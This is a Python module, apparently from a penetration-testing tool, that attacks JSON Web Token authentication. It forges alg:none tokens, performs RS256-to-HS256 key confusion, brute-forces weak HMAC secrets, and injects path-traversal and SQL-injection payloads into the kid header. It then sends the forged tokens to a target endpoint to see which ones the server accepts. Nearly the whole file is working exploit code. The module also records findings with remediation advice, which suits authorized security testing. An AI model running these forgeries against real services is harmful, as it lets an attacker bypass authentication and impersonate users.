"""JWT attack module — alg confusion, none attack, weak secret brute force, kid injection."""
from __future__ import annotations
import asyncio
import base64
import hashlib
import hmac
import json
import re
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.payload_engine import JWT_WEAK_SECRETS
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)


def _decode_jwt(token: str) -> tuple[dict, dict, str] | None:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        def _decode_b64(s: str) -> dict:
            s += "=" * (4 - len(s) % 4)
            return json.loads(base64.urlsafe_b64decode(s))
        header = _decode_b64(parts[0])
        payload = _decode_b64(parts[1])
        return header, payload, parts[2]
    except Exception:
        return None


def _encode_b64(data: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()


def _forge_none_alg(token: str) -> list[str]:
    """Forge tokens with alg:none (strip signature)."""
    decoded = _decode_jwt(token)
    if not decoded:
        return []
    header, payload, _ = decoded
    tokens = []
    for alg in ["none", "None", "NONE", "nOnE", "NoNe"]:
        h = {**header, "alg": alg}
        forged = f"{_encode_b64(h)}.{_encode_b64(payload)}."
        tokens.append(forged)
    return tokens


def _forge_hs256_with_rs256_pubkey(token: str, pubkey_pem: str) -> str | None:
    """RS256 → HS256 confusion: sign with public key as HMAC secret."""
    try:
        import hashlib, hmac
        decoded = _decode_jwt(token)
        if not decoded:
            return None
        header, payload, _ = decoded
        new_header = {**header, "alg": "HS256"}
        message = f"{_encode_b64(new_header)}.{_encode_b64(payload)}".encode()
        sig = hmac.new(pubkey_pem.encode(), message, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{_encode_b64(new_header)}.{_encode_b64(payload)}.{sig_b64}"
    except Exception:
        return None


def _brute_secret(token: str, secrets: list[str]) -> str | None:
    """Brute force HMAC secret."""
    decoded = _decode_jwt(token)
    if not decoded:
        return None
    header, payload, sig_b64 = decoded
    alg = header.get("alg", "HS256")
    if alg not in ("HS256", "HS384", "HS512"):
        return None
    hash_fn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }[alg]
    message = f"{token.rsplit('.', 1)[0]}".encode()
    sig = base64.urlsafe_b64decode(sig_b64 + "==")
    for secret in secrets:
        expected = hmac.new(secret.encode(), message, hash_fn).digest()
        if hmac.compare_digest(expected, sig):
            return secret
    return None


def _forge_kid_injection(token: str) -> list[dict[str, Any]]:
    """Inject malicious kid values — path traversal and SQL injection."""
    decoded = _decode_jwt(token)
    if not decoded:
        return []
    header, payload, _ = decoded
    variants = []
    for kid_payload in [
        "../../dev/null",
        "../../proc/sys/kernel/randomize_va_space",
        "' UNION SELECT 'secretkey'--",
        "1' OR '1'='1",
        "/dev/null",
    ]:
        new_header = {**header, "kid": kid_payload, "alg": "HS256"}
        # Sign with empty string (null file content) or 'secretkey'
        message = f"{_encode_b64(new_header)}.{_encode_b64(payload)}".encode()
        for secret in [b"", b"secretkey", b"null", b"\x00"]:
            sig = hmac.new(secret, message, hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            variants.append({
                "kid": kid_payload,
                "secret": secret.decode("utf-8", errors="replace"),
                "token": f"{_encode_b64(new_header)}.{_encode_b64(payload)}.{sig_b64}",
            })
    return variants


async def _test_token_against_endpoint(
    url: str, token: str, original_status: int, client: TalismanHTTPClient
) -> bool:
    """Test if a forged token is accepted."""
    try:
        r = await client.get(url, headers={"Authorization": f"Bearer {token}"})
        return r.status_code == original_status and r.status_code not in (401, 403)
    except Exception:
        return False


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    token: str | None = None,
    endpoint: str | None = None,
    crack_secret: bool = True,
    **kwargs: Any,
) -> dict[str, Any]:
    console.print(f"\n[module]⚡ JWT Attack Module[/module]")
    findings: list[dict[str, Any]] = []

    if not token:
        console.print("  [dim]No JWT provided — provide --token[/dim]")
        return {"findings": []}

    decoded = _decode_jwt(token)
    if not decoded:
        console.print("  [error]Invalid JWT format[/error]")
        return {"findings": []}

    header, payload, sig = decoded
    alg = header.get("alg", "unknown")
    console.print(f"  Algorithm: {alg}")
    console.print(f"  Claims: {', '.join(payload.keys())}")
    console.print(f"  Exp: {payload.get('exp', 'none')}")

    # — 1. Brute force secret ————————————————————————————————————
    if crack_secret and alg.startswith("HS"):
        console.print("  Brute-forcing secret...")
        found_secret = _brute_secret(token, JWT_WEAK_SECRETS)
        if found_secret:
            print_finding(f"JWT weak secret found: '{found_secret}'", "critical", target or "jwt")
            findings.append({"attack": "weak_secret", "secret": found_secret})
            if session:
                await session.add_finding(
                    target=target or "jwt", module="jwt",
                    vuln_type="jwt_weak_secret",
                    severity="critical", confidence="confirmed",
                    title=f"JWT signed with weak secret: '{found_secret}'",
                    description="JWT secret was brute-forced. Any attacker can forge tokens.",
                    evidence=f"Token signed with: {found_secret}",
                    remediation="Use a cryptographically random secret of at least 256 bits.",
                    cvss_score=9.8, cwe="CWE-326",
                )

    # — 2. Algorithm none ————————————————————————————————————————
    none_tokens = _forge_none_alg(token)
    if endpoint:
        async with TalismanHTTPClient(proxy=proxy, timeout=10) as client:
            try:
                orig = await client.get(endpoint, headers={"Authorization": f"Bearer {token}"})
                orig_status = orig.status_code
            except Exception:
                orig_status = 200
            for none_tok in none_tokens[:2]:
                accepted = await _test_token_against_endpoint(endpoint, none_tok, orig_status, client)
                if accepted:
                    print_finding("JWT 'alg:none' accepted by server", "critical", endpoint)
                    findings.append({"attack": "alg_none", "token": none_tok})
                    if session:
                        await session.add_finding(
                            target=endpoint, module="jwt",
                            vuln_type="jwt_alg_none",
                            severity="critical", confidence="confirmed",
                            title="JWT algorithm confusion — 'none' algorithm accepted",
                            description="Server accepts unsigned JWTs. Any attacker can forge tokens for any user.",
                            reproduction=f"Replace alg with 'none' and strip signature: {none_tok[:80]}...",
                            remediation="Explicitly validate JWT algorithm on server side. Reject tokens with alg=none.",
                            cvss_score=9.8, cwe="CWE-347",
                        )
                    break

    # — 3. kid injection ——————————————————————————————————————
    kid_variants = _forge_kid_injection(token)
    if endpoint and kid_variants:
        async with TalismanHTTPClient(proxy=proxy, timeout=10) as client:
            for variant in kid_variants[:5]:
                try:
                    r = await client.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {variant['token']}"},
                    )
                    if r.status_code not in (401, 403):
                        print_finding(f"JWT kid injection accepted — kid={variant['kid']}", "critical", endpoint)
                        findings.append({"attack": "kid_injection", **variant})
                        break
                except Exception:
                    pass

    console.print(f"  JWT analysis complete — {len(findings)} vulnerabilities found")
    return {"findings": findings, "header": header, "payload": payload, "alg": alg}
